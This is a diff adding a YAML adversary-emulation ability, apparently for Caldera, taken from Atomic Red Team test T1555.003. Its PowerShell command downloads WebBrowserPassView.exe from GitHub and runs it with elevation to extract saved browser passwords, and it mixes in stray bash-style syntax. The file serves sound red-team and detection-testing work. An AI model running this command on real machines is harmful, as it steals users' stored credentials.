@@ -1,0 +1,54 @@
+- id: e359627f-2d90-4320-ba5e-b0f878155bbe
+  name: WebBrowserPassView - Credentials from Browser
+  description: The following Atomic test utilizes WebBrowserPassView to extract passwords
+    from browsers on a Window system. WebBrowserPassView is an open source application
+    used to retrieve passwords stored on a local computer. Recently noticed as a tool
+    used in the BlackCat Ransomware.
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\"
+          -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe
+          -OutFile "PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe"; fi;
+          Start-Process "PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe";
+          Start-Sleep -Second 4; Stop-Process -Name "WebBrowserPassView"'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1555.003
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      webbrowserpassview_path:
+        description: 'Path to the WebBrowserPassView executable '
+        type: string
+        default: PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe
+    dependencies:
+    - description: 'Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}
+
+        '
+      prereq_command: 'if (Test-Path "#{webbrowserpassview_path}") {exit 0} else {exit
+        1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\"
+        -ErrorAction ignore -Force | Out-Null
+
+        Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe
+        -OutFile "#{webbrowserpassview_path}"
+
+        '
+    technique_created: '2020-02-12T18:57:36.041Z'
+    atomic_guid: e359627f-2d90-4320-ba5e-b0f878155bbe
+    import_timestamp: '2025-06-24T11:15:06.320667Z'
